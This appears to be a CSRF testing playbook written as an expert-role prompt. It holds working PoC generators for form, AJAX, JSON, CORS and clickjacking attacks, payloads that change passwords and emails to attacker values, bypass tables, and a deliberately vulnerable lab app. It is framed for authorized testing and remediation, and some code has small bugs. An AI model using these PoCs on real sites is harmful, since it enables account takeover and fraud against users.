# 15 — CSRF Testing Automation

## Expert Role

You are a senior application security engineer specializing in Cross-Site Request Forgery (CSRF) vulnerability research, detection, and automated exploitation. You have deep expertise in form-based CSRF, JSON-based CSRF, cookie-based CSRF, SameSite cookie analysis, CSRF token validation bypass, referrer policy analysis, and multi-step CSRF attack chains. You understand the complete CSRF exploitation chain from token prediction through anti-CSRF bypass to state-changing action execution on behalf of authenticated users. You approach every state-changing endpoint as a potential CSRF vector and systematically test for all CSRF variants including login CSRF, JSON content-type CSRF, and CSRF via subdomains. You are proficient in automated CSRF PoC generation, token analysis, and browser-based validation of CSRF attacks. You understand that modern CSRF requires understanding SameSite cookie attributes, CORS configurations, content-type enforcement, and framework-specific anti-CSRF mechanisms.

## Core Concepts

- **Classic Form-Based CSRF**: Attacker creates a malicious HTML page with an auto-submitting form targeting a state-changing endpoint. The form uses the victim's cookies for authentication. Test by creating forms with hidden fields that perform actions like password change, email update, or fund transfer.
- **JSON-Based CSRF**: Applications accepting JSON request bodies may still be vulnerable if they trust Content-Type: application/x-www-form-urlencoded or don't validate Content-Type. Attackers can use forms with hidden textarea or Flash-based techniques to send JSON payloads.
- **Cookie-Based CSRF (SameSite Bypass)**: If SameSite=None is set on session cookies, CSRF is possible even with modern browsers. If SameSite=Lax, GET-based CSRF is possible. SameSite=Strict provides strongest protection. Analyze all cookies for SameSite attribute.
- **CSRF Token Validation Bypass**: Applications may have weak token validation: tokens compared in timing-attack-vulnerable manner, tokens accepted from different user sessions, tokens not regenerated after login, or tokens predictable. Test each bypass technique.
- **Referrer Policy Analysis**: Some applications use Referrer header for CSRF protection. Test if Referrer can be suppressed (Referrer-Policy: no-referrer), manipulated, or if the application doesn't validate Referrer properly.
- **Multi-Step CSRF**: Complex operations requiring multiple sequential requests. Test if each step can be chained in CSRF, if step validation is per-step or per-operation, and if anti-CSRF tokens are validated per-step.
- **Login CSRF**: Attacker forces victim to log into attacker-controlled account. Victim believes they're using their own account but performing actions on attacker's account. Test login, registration, and OAuth flows.
- **Subdomain CSRF**: If cookies are set on parent domain, any subdomain can perform CSRF. Test for overly broad cookie domain attributes. Exploit via XSS on subdomain or subdomain takeover.
- **Flash-Based CSRF**: Legacy technique using Flash/SWF to send arbitrary Content-Type requests. While Flash is deprecated, test for legacy implementations and alternative techniques (PDF forms, SVG).
- **Clickjacking + CSRF**: Combine clickjacking with CSRF by framing the target page and tricking user into clicking elements that trigger CSRF-vulnerable actions.
- **CORS-Based CSRF**: If application reflects Origin in Access-Control-Allow-Origin with Access-Control-Allow-Credentials, attacker can make cross-origin requests with cookies. This enables CSRF-like attacks via XMLHttpRequest.
- **Method Override CSRF**: Applications using _method, X-HTTP-Method-Override, or X-Method-Override parameters. Test if DELETE/PUT methods are protected against CSRF while the override parameter is not.
- **CSRF Token in URL**: Tokens leaked in URL parameters (Referer header leakage). Test if tokens appear in URLs and are logged in server access logs, browser history, or referrer headers.
- **Missing Anti-CSRF Tokens**: State-changing endpoints without any CSRF protection. Test all POST, PUT, DELETE endpoints for missing tokens.
- **SameSite Cookie Bypass**: Lax+ enforcement can be bypassed with top-level navigation. Cross-site cookies may be sent during redirects. Test cookie behavior across different request types.

## Prerequisites

- Python 3.x with `requests`, `beautifulsoup4`, `colorama`, `tqdm`
- Burp Suite Professional with CSRF PoC generator extension
- Understanding of browser security model (SameSite, CORS, SOP)
- Knowledge of common frameworks' anti-CSRF implementations (Django, Rails, Laravel, Express)
- Testing environment with DVWA, WebGoat, or custom CSRF-vulnerable application
- Understanding of HTML form encoding and JavaScript fetch/XHR
- Browser developer tools for cookie analysis
- Understanding of token generation patterns and entropy

## Methodology

### Phase 1: Endpoint Discovery and Classification

```
Step 1: Identify all state-changing endpoints
         - POST, PUT, DELETE, PATCH methods
         - Forms that modify user data
         - API endpoints that change state
         - File upload endpoints
         - Password change, email update, profile edit
         - Fund transfer, order placement, settings change
         - Admin operations (user management, configuration)

Step 2: Classify CSRF protection mechanisms
         - Synchronizer token pattern (anti-CSRF tokens)
         - SameSite cookie attribute
         - Custom headers (X-Requested-With)
         - Referrer/Origin validation
         - CAPTCHA or reCAPTCHA
         - Multi-factor authentication step-up
         - JSON content-type validation

Step 3: Map authentication mechanism
         - Session cookies and their attributes
         - Authentication tokens in headers
         - API keys and their validation
         - OAuth/OIDC token handling
```

### Phase 2: CSRF Testing

```
Step 4: Test for missing CSRF tokens
         - Submit forms without CSRF token
         - Remove token parameter entirely
         - Submit with empty token value
         - Test all state-changing endpoints

Step 5: Test CSRF token validation
         - Use token from different session
         - Use expired token
         - Use token for different action
         - Submit token in different parameter name
         - Test token entropy (predictable tokens)
         - Test token scope (per-session vs per-request)

Step 6: Test SameSite cookie behavior
         - Analyze all session cookies for SameSite attribute
         - Test cross-site request with cookies
         - Test if SameSite=Lax allows GET-based CSRF
         - Test top-level navigation for SameSite bypass

Step 7: Test content-type based protection
         - Submit JSON payload as application/x-www-form-urlencoded
         - Submit with text/plain Content-Type
         - Submit with multipart/form-data
         - Test if Content-Type validation blocks CSRF
```

### Phase 3: Exploitation and Validation

```
Step 8: Generate CSRF PoC
         - Create auto-submitting HTML form
         - Create JavaScript fetch/XHR PoC
         - Create multi-step CSRF chain
         - Validate PoC in isolated browser

Step 9: Test bypass techniques
         - Referrer policy bypass
         - Content-type bypass
         - Method override CSRF
         - Subdomain CSRF chain
         - Clickjacking + CSRF combination
```

## Tool Arsenal

### CSRF PoC Generator

```python
#!/usr/bin/env python3
"""csrf_poc_generator.py — Automated CSRF PoC generation"""
import requests
import argparse
import json
from urllib.parse import urljoin, urlparse, parse_qs
from colorama import init, Fore
from bs4 import BeautifulSoup

init(autoreset=True)

class CSRFPOCGenerator:
    def __init__(self, target_url, session_cookie=None):
        self.target_url = target_url
        self.session = requests.Session()
        if session_cookie:
            self.session.cookies.update(session_cookie)

    def analyze_form(self, url):
        """Analyze forms on a page for CSRF vulnerabilities"""
        resp = self.session.get(url)
        soup = BeautifulSoup(resp.text, 'html.parser')
        forms = soup.find_all('form')
        results = []
        for form in forms:
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            inputs = form.find_all(['input', 'textarea', 'select'])
            fields = []
            has_csrf_token = False
            for inp in inputs:
                name = inp.get('name', '')
                value = inp.get('value', '')
                inp_type = inp.get('type', 'text')
                if any(t in name.lower() for t in ['csrf', 'token', '_token', 'authenticity', 'nonce']):
                    has_csrf_token = True
                fields.append({"name": name, "value": value, "type": inp_type})
            results.append({
                "action": urljoin(url, action),
                "method": method,
                "fields": fields,
                "has_csrf_token": has_csrf_token,
                "vulnerable": method == "POST" and not has_csrf_token
            })
        return results

    def generate_form_poc(self, action, method, fields):
        """Generate auto-submitting HTML form PoC"""
        fields_html = ""
        for field in fields:
            if field["type"] != "submit":
                fields_html += f'    <input type="hidden" name="{field["name"]}" value="{field["value"]}">\n'
        poc = f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<h1>CSRF Attack - Form Based</h1>
<p>This page will automatically submit a form to perform a CSRF attack.</p>
<form id="csrf-form" action="{action}" method="{method}">
{fields_html}    <input type="submit" value="Submit">
</form>
<script>
document.getElementById("csrf-form").submit();
</script>
</body>
</html>'''
        return poc

    def generate_ajax_poc(self, action, method, fields):
        """Generate AJAX-based CSRF PoC"""
        data = {f["name"]: f["value"] for f in fields if f["type"] != "submit"}
        poc = f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC - AJAX</title></head>
<body>
<h1>CSRF Attack - AJAX Based</h1>
<p>This page will automatically execute a CSRF attack via AJAX.</p>
<script>
var xhr = new XMLHttpRequest();
xhr.open("{method}", "{action}", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;
xhr.onreadystatechange = function() {{
    if (xhr.readyState === 4) {{
        document.body.innerHTML += "<p>Status: " + xhr.status + "</p>";
        document.body.innerHTML += "<p>Response: " + xhr.responseText.substring(0, 500) + "</p>";
    }}
}};
var params = {json.dumps(data)};
xhr.send(Object.keys(params).map(k => encodeURIComponent(k) + "=" + encodeURIComponent(params[k])).join("&"));
</script>
</body>
</html>'''
        return poc

    def generate_json_poc(self, action, json_data):
        """Generate JSON-based CSRF PoC"""
        poc = f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC - JSON</title></head>
<body>
<h1>CSRF Attack - JSON Based</h1>
<script>
fetch("{action}", {{
    method: "POST",
    credentials: "include",
    headers: {{
        "Content-Type": "text/plain"
    }},
    body: JSON.stringify({json.dumps(json_data)})
}}).then(r => r.text()).then(t => document.body.innerHTML += "<pre>" + t + "</pre>");
</script>
</body>
</html>'''
        return poc

    def generate_multipart_poc(self, action, fields):
        """Generate multipart/form-data CSRF PoC"""
        fields_html = ""
        for field in fields:
            if field["type"] != "submit":
                fields_html += f'    <input type="hidden" name="{field["name"]}" value="{field["value"]}">\n'
        poc = f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC - Multipart</title></head>
<body>
<h1>CSRF Attack - Multipart Based</h1>
<form id="csrf-form" action="{action}" method="POST" enctype="multipart/form-data">
{fields_html}    <input type="submit" value="Submit">
</form>
<script>document.getElementById("csrf-form").submit();</script>
</body>
</html>'''
        return poc

    def generate_cors_poc(self, action, method, data):
        """Generate CORS-based CSRF PoC"""
        poc = f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC - CORS</title></head>
<body>
<h1>CSRF Attack - CORS Based</h1>
<script>
var xhr = new XMLHttpRequest();
xhr.open("{method}", "{action}", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.onreadystatechange = function() {{
    if (xhr.readyState === 4) {{
        document.body.innerHTML += "<p>Status: " + xhr.status + "</p>";
    }}
}};
xhr.send(JSON.stringify({json.dumps(data)}));
</script>
</body>
</html>'''
        return poc

    def test_csrf(self, url, method="POST", data=None):
        """Test a specific endpoint for CSRF"""
        print(f"\n{Fore.YELLOW}[Testing] {method} {url}")
        if method == "POST":
            resp = self.session.post(url, data=data or {})
        elif method == "PUT":
            resp = self.session.put(url, data=data or {})
        elif method == "DELETE":
            resp = self.session.delete(url, data=data or {})
        else:
            resp = self.session.get(url)
        print(f"  Status: {resp.status_code}, Length: {len(resp.text)}")
        return resp

    def analyze_cookies(self, url):
        """Analyze cookies for SameSite attributes"""
        resp = self.session.get(url)
        cookies = resp.cookies
        analysis = []
        for cookie in cookies:
            same_site = cookie.get_nonstandard_attr("SameSite") or "None"
            analysis.append({
                "name": cookie.name,
                "domain": cookie.domain,
                "path": cookie.path,
                "secure": cookie.secure,
                "httponly": cookie.get_nonstandard_attr("HttpOnly"),
                "samesite": same_site,
                "csrf_risk": same_site == "None" or same_site == "Lax"
            })
        return analysis

    def generate_full_report(self, urls):
        """Generate complete CSRF analysis report"""
        print(f"\n{'='*60}")
        print(f"{Fore.CYAN}CSRF TESTING REPORT")
        print(f"{'='*60}")
        all_forms = []
        for url in urls:
            forms = self.analyze_form(url)
            all_forms.extend(forms)
        vulnerable = [f for f in all_forms if f["vulnerable"]]
        print(f"Forms analyzed: {len(all_forms)}")
        print(f"Vulnerable forms: {Fore.RED}{len(vulnerable)}{Style.RESET_ALL}")
        for v in vulnerable:
            print(f"\n  {Fore.RED}[!] {v['method']} {v['action']}")
            for field in v["fields"]:
                print(f"      - {field['name']}: {field['value'][:50]}")
            poc = self.generate_form_poc(v["action"], v["method"], v["fields"])
            print(f"      PoC length: {len(poc)} bytes")
        print(f"{'='*60}")

def main():
    parser = argparse.ArgumentParser(description="CSRF PoC Generator")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--cookie", help="Session cookie")
    parser.add_argument("--analyze", action="store_true", help="Analyze forms")
    args = parser.parse_args()

    cookies = {}
    if args.cookie:
        for c in args.cookie.split(";"):
            k, v = c.strip().split("=", 1)
            cookies[k] = v

    generator = CSRFPOCGenerator(args.url, cookies)
    if args.analyze:
        forms = generator.analyze_form(args.url)
        for f in forms:
            status = Fore.RED if f["vulnerable"] else Fore.GREEN
            print(f"{status}{f['method']} {f['action']} - Token: {f['has_csrf_token']}")

if __name__ == "__main__":
    main()
```

### SameSite Cookie Analyzer

```python
#!/usr/bin/env python3
"""samesite_analyzer.py — Analyze SameSite cookie behavior for CSRF"""
import requests
import argparse
from colorama import init, Fore

init(autoreset=True)

class SameSiteAnalyzer:
    def __init__(self, target_url, session_cookie=None):
        self.target_url = target_url
        self.session = requests.Session()
        if session_cookie:
            self.session.cookies.update(session_cookie)

    def analyze_set_cookie_headers(self):
        """Analyze Set-Cookie headers for SameSite attributes"""
        resp = self.session.get(self.target_url)
        cookies = resp.headers.get('Set-Cookie', '')
        analysis = []
        for cookie_header in resp.headers.getlist('Set-Cookie') if hasattr(resp.headers, 'getlist') else [cookies]:
            if not cookie_header:
                continue
            cookie_dict = {}
            parts = cookie_header.split(';')
            cookie_dict['raw'] = cookie_header
            cookie_dict['name'] = parts[0].split('=')[0].strip()
            samesite = None
            for part in parts[1:]:
                part = part.strip().lower()
                if part.startswith('samesite='):
                    samesite = part.split('=')[1]
                elif part == 'secure':
                    cookie_dict['secure'] = True
                elif part == 'httponly':
                    cookie_dict['httponly'] = True
            cookie_dict['samesite'] = samesite
            if samesite is None:
                cookie_dict['risk'] = 'HIGH — No SameSite attribute'
            elif samesite == 'none':
                cookie_dict['risk'] = 'HIGH — SameSite=None (cross-site allowed)'
            elif samesite == 'lax':
                cookie_dict['risk'] = 'MEDIUM — SameSite=Lax (GET cross-site allowed)'
            elif samesite == 'strict':
                cookie_dict['risk'] = 'LOW — SameSite=Strict'
            else:
                cookie_dict['risk'] = f'UNKNOWN — {samesite}'
            analysis.append(cookie_dict)
        return analysis

    def test_cross_site_request(self, origin_url, target_endpoint):
        """Test if cookies are sent in cross-site context"""
        # Simulate cross-site by setting Referer header
        headers = {'Referer': origin_url, 'Origin': origin_url}
        resp = self.session.post(target_endpoint, headers=headers)
        return {
            'status': resp.status_code,
            'cookies_sent': bool(self.session.cookies),
            'response': resp.text[:200]
        }

    def generate_report(self):
        """Generate SameSite analysis report"""
        analysis = self.analyze_set_cookie_headers()
        print(f"\n{'='*60}")
        print(f"{Fore.CYAN}SAMESITE COOKIE ANALYSIS")
        print(f"{'='*60}")
        print(f"Target: {self.target_url}")
        for cookie in analysis:
            risk_color = Fore.RED if 'HIGH' in cookie['risk'] else Fore.YELLOW if 'MEDIUM' in cookie['risk'] else Fore.GREEN
            print(f"\n  Cookie: {cookie['name']}")
            print(f"  SameSite: {cookie.get('samesite', 'Not Set')}")
            print(f"  {risk_color}Risk: {cookie['risk']}")
        print(f"\n{'='*60}")

def main():
    parser = argparse.ArgumentParser(description="SameSite Cookie Analyzer")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--cookie", help="Session cookie")
    args = parser.parse_args()

    cookies = {}
    if args.cookie:
        for c in args.cookie.split(";"):
            k, v = c.strip().split("=", 1)
            cookies[k] = v

    analyzer = SameSiteAnalyzer(args.url, cookies)
    analyzer.generate_report()

if __name__ == "__main__":
    main()
```

### CSRF Token Analyzer

```python
#!/usr/bin/env python3
"""csrf_token_analyzer.py — Analyze CSRF tokens for weaknesses"""
import requests
import hashlib
import math
import string
import argparse
from collections import Counter
from colorama import init, Fore

init(autoreset=True)

class CSRFTokenAnalyzer:
    def __init__(self, token):
        self.token = token

    def analyze_entropy(self):
        """Analyze token entropy"""
        charset_size = 0
        if any(c.isalpha() for c in self.token):
            charset_size += 52
        if any(c.isdigit() for c in self.token):
            charset_size += 10
        if any(c in string.punctuation for c in self.token):
            charset_size += len(string.punctuation)
        entropy = len(self.token) * math.log2(charset_size) if charset_size > 0 else 0
        return {
            "length": len(self.token),
            "charset_size": charset_size,
            "entropy_bits": round(entropy, 2),
            "strength": "Strong" if entropy >= 128 else "Medium" if entropy >= 64 else "Weak"
        }

    def analyze_pattern(self):
        """Check for patterns in token"""
        patterns = {
            "sequential": self.token == "".join(sorted(self.token)),
            "repeated": len(set(self.token)) < len(self.token) / 2,
            "timestamp": self.token.isdigit() and len(self.token) >= 10,
            "base64": all(c in string.ascii_letters + string.digits + '+/=' for c in self.token),
            "hex": all(c in string.hexdigits for c in self.token),
            "all_same_case": self.token.islower() or self.token.isupper(),
            "contains_username": False,  # Would need context
            "sequential_numbers": any(self.token[i:i+2].isdigit() and int(self.token[i:i+2]) == int(self.token[i]) + 1 for i in range(len(self.token)-2)),
        }
        return patterns

    def test_token_reuse(self, tokens):
        """Test if tokens are reused across sessions"""
        unique_tokens = set(tokens)
        return {
            "total_tokens": len(tokens),
            "unique_tokens": len(unique_tokens),
            "reuse_rate": 1 - (len(unique_tokens) / len(tokens)),
            "reused": len(unique_tokens) < len(tokens)
        }

    def full_analysis(self):
        """Run complete token analysis"""
        entropy = self.analyze_entropy()
        patterns = self.analyze_pattern()
        print(f"\n{'='*60}")
        print(f"{Fore.CYAN}CSRF TOKEN ANALYSIS")
        print(f"{'='*60}")
        print(f"Token: {self.token[:20]}...")
        print(f"Length: {entropy['length']}")
        print(f"Entropy: {entropy['entropy_bits']} bits")
        print(f"Strength: {entropy['strength']}")
        print(f"\nPatterns:")
        for pattern, found in patterns.items():
            if found:
                print(f"  {Fore.RED}[!] {pattern}: detected")
        print(f"{'='*60}")

def main():
    parser = argparse.ArgumentParser(description="CSRF Token Analyzer")
    parser.add_argument("-t", "--token", required=True, help="Token to analyze")
    args = parser.parse_args()

    analyzer = CSRFTokenAnalyzer(args.token)
    analyzer.full_analysis()

if __name__ == "__main__":
    main()
```

### Burp Extension CSRF PoC Generator

```python
#!/usr/bin/env python3
"""burp_csrf_gen.py — Generate CSRF PoCs from Burp Suite requests"""
import json
import sys
from urllib.parse import parse_qs, urlparse
from colorama import init, Fore

init(autoreset=True)

def parse_burp_request(request_file):
    """Parse Burp Suite request file"""
    with open(request_file, 'r') as f:
        content = f.read()
    lines = content.split('\n')
    method = lines[0].split(' ')[0]
    path = lines[0].split(' ')[1]
    headers = {}
    body = ""
    body_start = False
    for line in lines[1:]:
        if body_start:
            body += line + "\n"
        elif line.strip() == "":
            body_start = True
        elif ":" in line:
            key, value = line.split(":", 1)
            headers[key.strip()] = value.strip()
    return {"method": method, "path": path, "headers": headers, "body": body}

def generate_csrf_html(request, output_file):
    """Generate CSRF PoC HTML from parsed request"""
    method = request["method"]
    path = request["path"]
    body = request["body"].strip()
    is_json = "application/json" in request["headers"].get("Content-Type", "")
    if is_json:
        poc = f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<h1>CSRF Attack PoC</h1>
<p>Target: {method} {path}</p>
<script>
var xhr = new XMLHttpRequest();
xhr.open("{method}", "{path}", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.onreadystatechange = function() {{
    if (xhr.readyState === 4) {{
        document.body.innerHTML += "<pre>" + xhr.responseText + "</pre>";
    }}
}};
xhr.send({repr(body)});
</script>
</body>
</html>'''
    else:
        params = parse_qs(body)
        fields_html = ""
        for key, values in params.items():
            fields_html += f'    <input type="hidden" name="{key}" value="{values[0]}">\n'
        poc = f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<h1>CSRF Attack PoC</h1>
<p>Target: {method} {path}</p>
<form id="csrf" action="{path}" method="{method}">
{fields_html}    <input type="submit" value="Execute CSRF">
</form>
<script>document.getElementById("csrf").submit();</script>
</body>
</html>'''
    with open(output_file, 'w') as f:
        f.write(poc)
    print(f"{Fore.GREEN}[+] CSRF PoC saved to: {output_file}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python burp_csrf_gen.py <request_file> <output.html>")
        sys.exit(1)
    request = parse_burp_request(sys.argv[1])
    generate_csrf_html(request, sys.argv[2])
```

## Case Studies

### Case Study 1: CSRF to Account Takeover

**Target**: Password change functionality
**Vulnerability**: No anti-CSRF token on password change endpoint
**Attack**: Auto-submitting form that changes victim's password to attacker-controlled value
**Payload**: `<form action="https://target.com/change-password" method="POST"><input type="hidden" name="new_password" value="attacker123"><input type="submit"></form><script>document.forms[0].submit()</script>`
**Impact**: Account takeover — attacker changes password and gains access
**CVSS**: 8.1 (High)
**Fix**: Implement anti-CSRF tokens, require re-authentication for password changes

### Case Study 2: JSON Content-Type CSRF

**Target**: API endpoint accepting JSON for profile update
**Vulnerability**: Server accepts application/x-www-form-urlencoded and text/plain Content-Types
**Attack**: Using fetch with text/plain Content-Type bypasses Content-Type validation
**Payload**: `fetch("/api/profile",{method:"POST",headers:{"Content-Type":"text/plain"},"body":'{"email":"attacker@evil.com"}',credentials:"include"})`
**Impact**: Email change → account recovery hijack → full account takeover
**CVSS**: 7.5 (High)
**Fix**: Strict Content-Type validation, CORS restrictions, anti-CSRF tokens

### Case Study 3: SameSite=Lax Bypass

**Target**: Admin action endpoint with SameSite=Lax cookies
**Vulnerability**: SameSite=Lax allows top-level GET navigation with cookies
**Attack**: `<img src="https://target.com/admin/delete-user?id=victim">` triggers GET-based CSRF
**Impact**: Admin actions executed via GET request from attacker's page
**CVSS**: 6.5 (Medium-High)
**Fix**: Use POST with anti-CSRF tokens for all state-changing operations, set SameSite=Strict

### Case Study 4: Multi-Step CSRF Chain

**Target**: Fund transfer requiring confirmation step
**Vulnerability**: Each step validated independently, tokens not bound to specific step
**Attack**: Chain Step 1 (initiate transfer) → Step 2 (confirm transfer) in single PoC
**Impact**: Fund transfer from victim's account
**CVSS**: 8.1 (High)
**Fix**: Bind tokens to specific action and step, validate token uniqueness per request

### Case Study 5: Login CSRF

**Target**: Login form without CSRF protection
**Vulnerability**: Login endpoint accepts GET requests with credentials in URL
**Attack**: `<img src="https://target.com/login?user=attacker&pass=attacker123">` logs victim into attacker's account
**Impact**: Victim thinks they're using their account but actions are on attacker's account; data leakage
**CVSS**: 6.5 (Medium-High)
**Fix**: Require POST for login, implement CSRF token on login form, log login source

## Bypass Techniques

### Token Validation Bypass

| Technique | Description |
|-----------|-------------|
| Remove token | Submit request without token parameter |
| Empty token | Submit with empty token value |
| Wrong token | Use token from different user/session |
| Expired token | Use old but previously valid token |
| Wrong action | Use token generated for different endpoint |
| Token in URL | Move token to URL parameter (if validated only in body) |
| Double submit | Send token in both cookie and body (if compared loosely) |
| Predictable tokens | Predict next token using mathematical patterns |

### Content-Type Bypass

| Content-Type | Bypass |
|--------------|--------|
| text/plain | Some frameworks accept without validation |
| multipart/form-data | Boundary manipulation bypasses |
| application/x-www-form-urlencoded | Default form encoding |
| application/json | If framework accepts multiple types |

### Method Override

| Technique | Payload |
|-----------|---------|
| _method parameter | POST with `_method=DELETE` |
| X-HTTP-Method-Override | Header override |
| X-Method-Override | Header override |
| Override header | Custom override header |

### SameSite Bypass

| Technique | Description |
|-----------|-------------|
| Top-level navigation | SameSite=Lax allows cross-site GET |
| Redirect chain | Cross-site redirect preserves cookies |
| Window.open | New window may not be cross-site |
| Link decoration | URL parameters across sites |
| Fallback behavior | Some browsers have fallback behaviors |

## Advanced Techniques

### Automated CSRF Chain Discovery

```python
def discover_csrf_chains(base_url, endpoints):
    """Discover multi-step CSRF chains"""
    chains = []
    for endpoint in endpoints:
        resp = requests.get(f"{base_url}{endpoint}")
        soup = BeautifulSoup(resp.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            next_url = form.get('action', '')
            if next_url in endpoints:
                chains.append([endpoint, next_url])
    return chains
```

### CSRF Token Prediction

```python
def predict_token_pattern(tokens):
    """Analyze token patterns for predictability"""
    if all(t.isdigit() for t in tokens):
        # Sequential tokens
        diffs = [int(tokens[i+1]) - int(tokens[i]) for i in range(len(tokens)-1)]
        if len(set(diffs)) == 1:
            return f"Sequential pattern, increment: {diffs[0]}"
    # Check for time-based patterns
    timestamps = []
    for token in tokens:
        try:
            ts = int(token[:10])
            timestamps.append(ts)
        except:
            pass
    if timestamps:
        return f"Possible timestamp-based tokens"
    return "No obvious pattern"
```

### Clickjacking + CSRF Combo

```python
def generate_clickjack_csrf_poc(target_url, action_text="Click here for free prize"):
    """Generate clickjacking + CSRF combination PoC"""
    return f'''<!DOCTYPE html>
<html>
<head><title>Clickjacking + CSRF</title></head>
<body>
<div style="position: relative; width: 800px; height: 600px;">
  <div style="position: absolute; top: 100px; left: 200px; z-index: 2;">
    <button style="font-size: 24px; padding: 20px;">{action_text}</button>
  </div>
  <iframe src="{target_url}" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.0001; z-index: 1;"></iframe>
</div>
</body>
</html>'''
```

## Detection Indicators

### Application-Level Indicators

```
- State-changing operations (POST, PUT, DELETE) without CSRF tokens
- Anti-CSRF tokens present but not validated server-side
- Tokens accepted from different user sessions
- Tokens not regenerated after login or privilege change
- SameSite=None on session cookies
- Custom headers (X-Requested-With) accepted without validation
- Content-Type validation is client-side only
- Referrer/Origin validation is absent or weak
- Login form without CSRF protection
- Password change without step-up authentication
```

### Browser-Level Indicators

```
- Session cookies without SameSite attribute
- SameSite=None with Secure flag not set
- Overly broad cookie domain (set on parent domain)
- Missing or weak Referrer-Policy header
- CORS misconfiguration allowing credentials
```

### Network Indicators

```
- State-changing requests accepted without tokens
- Cross-origin requests with credentials allowed
- Missing anti-CSRF headers (X-Frame-Options, CSP)
```

## Impact Assessment

### CSRF Severity Matrix

| CSRF Type | Impact | CVSS | Severity |
|-----------|--------|------|----------|
| Account takeover (password change) | Full account compromise | 8.1 | High |
| Fund transfer | Financial loss | 8.8 | High |
| Email change | Account recovery hijack | 7.5 | High |
| Admin action execution | Privilege abuse | 8.1 | High |
| Settings modification | Configuration change | 5.0-7.5 | Medium-High |
| Login CSRF | Account confusion | 6.5 | Medium-High |
| Data deletion | Data loss | 7.5 | High |

### Business Impact

- **Account Takeover**: Change password or email to gain control
- **Financial Fraud**: Initiate unauthorized transfers or purchases
- **Data Modification**: Change user data, settings, or permissions
- **Privilege Escalation**: Execute admin actions as regular user
- **Reputation Damage**: Actions performed as victim user
- **Compliance Violation**: Unauthorized data modification

## Common Pitfalls

1. **Only testing POST endpoints**: PUT, DELETE, PATCH, and even GET (with state changes) can be vulnerable.
2. **Ignoring SameSite=Lax**: Lax still allows top-level GET navigation with cookies.
3. **Missing JSON CSRF**: JSON endpoints can be CSRF-vulnerable if Content-Type isn't strictly enforced.
4. **Not testing login forms**: Login CSRF is often overlooked.
5. **Ignoring method override**: _method parameter can bypass method-based CSRF protection.
6. **Missing multi-step CSRF**: Complex operations may be CSRF-vulnerable across multiple steps.
7. **Not testing token scope**: Tokens may be valid across different users or sessions.
8. **Ignoring subdomain CSRF**: Overly broad cookie domain affects all subdomains.
9. **Missing clickjacking+CSRF**: CSRF via clickjacking frames the target and triggers actions.
10. **Not validating token entropy**: Predictable tokens enable CSRF exploitation.

## Integration Points

### With Authentication Testing

```
- Test CSRF on authentication endpoints (login, logout, password reset)
- Analyze session cookie attributes for CSRF implications
- Test SameSite cookie behavior with authentication flows
- Check if authentication state changes require CSRF protection
```

### With XSS Hunting

```
- XSS can bypass CSRF protections by stealing tokens
- XSS on subdomain enables parent domain CSRF
- XSS in cookie-setting context can set SameSite=None
- Chain XSS + CSRF for enhanced exploitation
```

### With Session Management Testing

```
- Analyze session token handling for CSRF implications
- Test session fixation via CSRF
- Check if session tokens are bound to specific requests
- Test session handling across subdomains
```

### With API Security Testing

```
- Test API endpoints for CSRF (often overlooked)
- Check Content-Type validation for JSON APIs
- Test CORS configuration for CSRF implications
- Analyze API authentication for CSRF resistance
```

### With Clickjacking Testing

```
- Combine clickjacking with CSRF for enhanced attacks
- Test if X-Frame-Options or CSP frame-ancestors prevents framing
- Use clickjacking to trigger CSRF-vulnerable actions
```

## Reporting Templates

### CSRF Report Template

```
## [HIGH] Cross-Site Request Forgery (CSRF)

**Endpoint**: POST /action
**Protection**: [None / Token Present But Not Validated / Weak Validation]
**CVSS**: [Score] (High)

### Description
The application's [action] endpoint is vulnerable to CSRF. An attacker can
create a malicious page that submits a form to this endpoint, performing
actions on behalf of authenticated users.

### Steps to Reproduce
1. Log in as victim user
2. Open the PoC HTML page in the same browser
3. Observe the action is performed automatically

### Impact
- Attacker can perform any action on behalf of the victim
- Account takeover via password/email change
- Financial fraud via unauthorized transactions
- Data modification or deletion

### Remediation
- Implement anti-CSRF tokens (synchronizer token pattern)
- Set SameSite=Strict on session cookies
- Require re-authentication for sensitive actions
- Validate Content-Type for API endpoints
- Use custom headers (X-Requested-With) for AJAX requests
```

## Practice Labs

### CSRF Labs Setup

```bash
# DVWA CSRF
docker run --rm -it -p 8080:80 vulnerables/web-dvwa

# WebGoat CSRF lessons
docker run -d -p 8080:8080 webgoat/webgoat

# OWASP CSRFGuard test app
git clone https://github.com/OWASP/CSRFGuard.git

# PortSwigger CSRF labs
# Access: https://portswigger.net/web-security/csrf
```

### Custom CSRF Practice App

```python
# vulnerable_csrf_app.py — Flask app with intentional CSRF vulnerabilities
from flask import Flask, request, redirect, session, make_response
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)

@app.route("/")
def index():
    return """
    <h1>CSRF Lab</h1>
    <h2>1. No CSRF Protection (Vulnerable)</h2>
    <form action="/change-email" method="POST">
        <input type="email" name="email" placeholder="New email">
        <button type="submit">Change Email</button>
    </form>
    <h2>2. Weak Token (Vulnerable)</h2>
    <form action="/change-email-weak" method="POST">
        <input type="hidden" name="csrf_token" value="12345">
        <input type="email" name="email" placeholder="New email">
        <button type="submit">Change Email (Weak Token)</button>
    </form>
    <h2>3. Strong Token (Secure)</h2>
    <form action="/change-email-strong" method="POST">
        <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
        <input type="email" name="email" placeholder="New email">
        <button type="submit">Change Email (Strong Token)</button>
    </form>
    """

@app.route("/change-email", methods=["POST"])
def change_email():
    email = request.form.get("email")
